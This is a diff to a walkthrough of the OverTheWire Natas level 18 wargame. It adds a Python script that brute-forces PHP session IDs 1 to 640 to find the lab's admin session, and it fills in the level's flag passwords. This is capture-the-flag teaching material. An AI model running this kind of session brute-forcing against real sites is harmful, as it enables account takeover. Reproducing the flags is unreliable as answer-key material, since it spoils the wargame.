@@ -26,11 +26,46 @@ That is, the value of the key `"admin"` in `$_SESSION` needs to be 1, and we hav
 
 ![](6.png)
 
-The creation of sessions is limited! This means that one of the sessions may be the admin's. We have control over the current session number using PHPSESSION in the `$_COOKIE`:
+The creation of sessions is limited! This means that one of the sessions may be the admin's. We have control over the current session number using `PHPSESSID` in the `$_COOKIE`:
 
+![](7.png)
 
+The `createID()` function is responsible for the randomness and range of the session we will receive from the server.
+
+![](8.png)
+
+So, we will now build a Python program that will try to log-in by brute force on the value of the `PHPSESSID` key in the cookie:
+
+```python
+from requests import get
+from requests.auth import HTTPBasicAuth
+
+# Current level details
+natas18_username = "natas18"
+natas18_password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"
+
+# GET HTTP details
+URL = "http://natas18.natas.labs.overthewire.org/?username=admin&password=admin"
+AUTH = HTTPBasicAuth(natas18_username, natas18_password)
+COOKIES = {'PHPSESSID': None}
+
+res = None
+for i in range(1, 640 + 1):
+    COOKIES['PHPSESSID'] = str(i)
+    res = get(url=URL, auth=AUTH, cookies=COOKIES)
+    if "Password" in res.text:
+        print(f"admin PHPSESSID value is: {i}")
+        break
+    else:
+        print(f"admin PHPSESSID value is NOT: {i}")
+
+print(res.text)
+```
+
+Results:
+![](9.png)
 
 ## Password for the next level:
 ```
-
+8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
 ```
